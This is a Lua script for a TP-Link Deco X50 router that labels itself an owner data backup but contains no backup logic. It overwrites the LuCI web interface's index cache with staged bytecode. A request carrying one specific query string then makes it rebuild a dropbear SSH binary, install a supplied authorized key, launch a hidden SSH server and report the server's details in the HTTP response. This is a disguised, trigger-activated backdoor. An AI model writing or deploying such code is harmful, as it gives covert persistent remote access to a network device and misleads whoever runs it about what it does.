-- Deco X50 owner critical-data backup: @NONCE@

local function decode64(s)
assert(#s % 4 == 0, "base64 length")
local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local map = {}
for i=1,#alphabet do map[alphabet:byte(i)] = i-1 end
local out = {}
for i=1,#s,4 do
local a,b,c,d = s:byte(i,i+3)
assert(map[a] and map[b], "base64 prefix")
assert(c == 61 or map[c], "base64 character")
assert(d == 61 or map[d], "base64 character")
assert(c ~= 61 or d == 61, "base64 padding")
assert((c ~= 61 and d ~= 61) or i+3 == #s, "base64 final padding")
local n = map[a]*262144 + map[b]*4096 + (map[c] or 0)*64 + (map[d] or 0)
out[#out+1] = string.char(math.floor(n/65536) % 256)
if c ~= 61 then out[#out+1] = string.char(math.floor(n/256) % 256) end
if d ~= 61 then out[#out+1] = string.char(n % 256) end
end
return table.concat(out)
end
local parts={"/tmp/deco-x50-ssh-@NONCE@-part-00.b64","/tmp/deco-x50-ssh-@NONCE@-part-01.b64","/tmp/deco-x50-ssh-@NONCE@-part-02.b64","/tmp/deco-x50-ssh-@NONCE@-part-03.b64","/tmp/deco-x50-ssh-@NONCE@-part-04.b64","/tmp/deco-x50-ssh-@NONCE@-part-05.b64","/tmp/deco-x50-ssh-@NONCE@-part-06.b64","/tmp/deco-x50-ssh-@NONCE@-part-07.b64","/tmp/deco-x50-ssh-@NONCE@-part-08.b64"}
local encoded={}
for i,path in ipairs(parts) do
local f=assert(io.open(path,"rb"))
encoded[i]=assert(f:read("*a")); assert(f:close())
end
local original=decode64(table.concat(encoded))
assert(#original==19955 and original:sub(1,5)=="\027LuaQ","restore identity")
local original_fn=assert(loadstring(original))
local f=assert(io.open("/tmp/luci-indexcache","wb"))
assert(f:write(original)); assert(f:close())
local verify=assert(io.open("/tmp/luci-indexcache","rb"))
local restored=verify:read("*a"); assert(verify:close())
assert(restored==original,"restore readback")
if os.getenv('REQUEST_METHOD')~='GET' or os.getenv('QUERY_STRING')~="form=keys&operation=read&deco_backup=@OP@-001" then return original_fn() end
local base="/tmp/deco-x50-ssh-@NONCE@";local auth="/etc/deco-x50-ssh-@NONCE@";local bin=base..'/dropbearmulti'
local function run(command,soft)
local p=assert(io.popen("umask 077;ulimit -c 0;("..command..") 2>&1;rc=$?;printf '\nDECO_SSH_RC:%s\n' \"$rc\"",'r'))
local raw=p:read('*a') or '';assert(p:close());local out,rc=raw:match('^(.*)\nDECO_SSH_RC:(%d+)\n$');assert(rc,'command status unavailable')
local ok=rc=='0';if not soft then assert(ok,(out or ''):sub(1,256)) end;return out,ok
end
local ok,result=pcall(function()
local fs=require'nixio.fs';local nx=require'nixio'
local result
assert(not fs.stat(base) and not fs.stat(auth),'session path exists')
assert(fs.mkdir(base,'0700'));assert(fs.mkdir(auth,'0700'))
local pieces={}
for i=0,41 do local f=assert(io.open(base..string.format('-bin-%03d.b64',i),'rb'));pieces[#pieces+1]=assert(f:read('*a'));assert(f:close()) end
local f=assert(io.open(base..'/server.gz','wb'));assert(f:write(decode64(table.concat(pieces))));assert(f:close())
run('/bin/busybox gzip -dc '..base..'/server.gz > '..bin);assert(fs.chmod(bin,'0700'))
local digest=run('/bin/busybox sha1sum '..bin)
assert(digest=="211d4831cdc9a9b87367c3ee2e7ba759e5dcf500  /tmp/deco-x50-ssh-@NONCE@/dropbearmulti\n",'server checksum')
local f=assert(io.open(auth..'/authorized_keys','wb'));assert(f:write("@PUBLIC_KEY@\n"));assert(f:close());assert(fs.chmod(auth..'/authorized_keys','0600'))
run(bin..' dropbearkey -t ed25519 -f '..base..'/hostkey')
local pub=assert(run(bin..' dropbearkey -y -f '..base..'/hostkey'):match('(ssh%-ed25519 [A-Za-z0-9+/=]+)'))
local chosen,last_error
for _,addr in ipairs({'@TARGET@:20003'}) do
local out,ok=run(bin.." dropbear -p '"..addr.."' -P "..base..'/server.pid -D '..auth..' -r '..base..'/hostkey -K 30 -T 3 </dev/null >'..base..'/server.log 2>&1',true)
if ok then chosen=addr;break end;last_error=out
local f=io.open(base..'/server.log','rb');if f then last_error=f:read(256) or out;f:close() end
end
assert(chosen,('no free permitted loopback endpoint: '..(last_error or '')):sub(1,256))
local pid
for i=1,50 do
local f=io.open(base..'/server.pid','rb')
if f then local s=f:read('*a') or '';f:close();pid=s:match('^(%d+)%s*$') end
if pid and fs.readlink('/proc/'..pid..'/exe')==bin then break end
pid=nil;nx.nanosleep(0,100000000)
end
assert(pid,'temporary server not running')
result="READY:@OP@-001\n"..pid..'\n'..pub..'\n'..chosen..'\n'
return result end)
if not ok then result="FAILED:@OP@-001\n"..tostring(result):sub(1,300)..'\n' end
local f=assert(io.open(base.."-result-@OP@-001.txt",'wb'));assert(f:write(result));assert(f:close())
assert(io.write("Status: 200 OK\r\nContent-Type: application/octet-stream\r\nCache-Control: no-store\r\nX-Deco-Backup: @OP@-001\r\nContent-Length: ",tostring(#result),'\r\n\r\n',result));assert(io.flush());os.exit(0)
